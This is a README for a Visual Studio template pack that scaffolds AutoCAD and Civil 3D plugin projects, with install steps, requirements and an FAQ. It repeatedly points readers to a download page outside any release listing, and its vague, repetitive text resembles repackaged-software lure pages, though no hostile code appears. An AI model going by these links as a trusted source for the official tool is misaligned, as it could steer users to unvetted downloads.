# AutoCAD .NET Wizards v2026 - Visual Studio Template Wizard 2026

> **A Visual Studio wizard collection for creating AutoCAD plugin projects on Windows, delivered through VSIX template installation and aligned with the current .NET workflow in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20%2F%20Visual%20Studio-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-lewis68/autocad-net-wizards-v2026?style=flat-square)](https://github.com/zack-lewis68/autocad-net-wizards-v2026)

---

<p align="center">
  <a href="https://zack-lewis68.github.io/autocad-net-wizards-v2026/">
    <img src="https://img.shields.io/badge/Download-AutoCAD%20.NET%20Wizards%20Latest-brightgreen?style=for-the-badge" alt="Download AutoCAD .NET Wizards">
  </a>
</p>

> **[Direct Download - AutoCAD .NET Wizards v2026](https://zack-lewis68.github.io/autocad-net-wizards-v2026/)**

---

[Download Latest Build](https://zack-lewis68.github.io/autocad-net-wizards-v2026/)

---

## Overview

AutoCAD .NET Wizards streamlines the setup of Visual Studio projects for AutoCAD-focused development by providing a guided template flow. It is intended for developers working with AutoCAD, Civil 3D, and related Autodesk ecosystems who want to move from a blank solution to a build-ready plugin structure with less repetitive setup.

The templates ship as a VSIX package and follow modern .NET project practices. Both C# and VB template packs are included, so new plugin projects can be started without recreating the same boilerplate for every build.

---

## What it includes

- Installs Visual Studio project templates through a VSIX package
- Provides modern .NET Core wizard templates for AutoCAD plugins
- Supports both C# and VB template packs
- Includes launch profiles for AutoCAD and Civil 3D
- References AutoCAD, ACA, and C3D assemblies
- Supports building and exporting template packs
- Designed for Visual Studio on Windows
- Suited to plugin and ObjectARX-adjacent project setups

---

## Installation steps

1. Download the latest build from the release page linked above.
2. Install the VSIX package into Visual Studio.
3. Restart Visual Studio if prompted so the templates appear correctly.

If you are working from source, clone the repository and open the solution in Visual Studio before building the template pack.

---

## How to use it

Once installed, create a new project in Visual Studio and pick the AutoCAD .NET wizard template that fits your language and target workflow.

Typical workflow:

1. Start a new project from the installed template.
2. Choose C# or VB, depending on your preferred template pack.
3. Select the launch profile for AutoCAD or Civil 3D when available.
4. Build the generated project and test the output in the target Autodesk application.

If you are exporting template packs, build the solution first and then use the available pack export workflow from the project setup.

---

## Configuration notes

Template behavior is defined through the Visual Studio project and wizard files included in the repository. Launch settings are controlled by the supplied AutoCAD and Civil 3D profiles, while assembly references are set in the generated project structure.

A typical project-level configuration pattern may include:

    {
      "launchProfile": "AutoCAD",
      "language": "C#"
    }

Adjust the generated project files if you need different references, launch targets, or template pack output settings.

---

## Requirements

- Windows
- Visual Studio
- VSIX support for template installation
- AutoCAD development assemblies
- Optional Civil 3D assemblies for Civil 3D-targeted workflows
- C# or VB support, depending on the selected template pack

---

## FAQ

**How do I install the templates?**  
Install the VSIX package in Visual Studio, then restart the IDE if needed.

**Which languages are supported?**  
The template packs include both C# and VB options.

**Can I target Civil 3D?**  
Yes, launch profiles are included for AutoCAD and Civil 3D.

**Where are the project references defined?**  
References are part of the generated template and project setup, including AutoCAD, ACA, and C3D assemblies.

**How do I update to a newer build?**  
Download the latest package from the linked build page and reinstall or replace the existing template installation as needed.

**What if the template does not appear in Visual Studio?**  
Check that the VSIX was installed successfully, restart Visual Studio, and confirm that template discovery is enabled for your environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
